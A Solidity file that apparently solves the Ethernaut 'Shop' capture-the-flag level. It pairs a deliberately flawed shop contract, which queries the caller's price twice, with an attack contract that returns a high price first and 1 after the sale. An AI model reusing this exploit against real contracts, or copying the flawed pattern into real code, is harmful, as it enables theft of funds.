// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
contract attack{
  Shop shop;
  constructor(address add) public
  {
    shop= Shop(add);
  }
  function price() external view returns (uint)
  {
    if(shop.isSold()==true)
    {return 1;}
    else 
    {return 101;}
  }
  function att()public
  {
    shop.buy();
  }
}
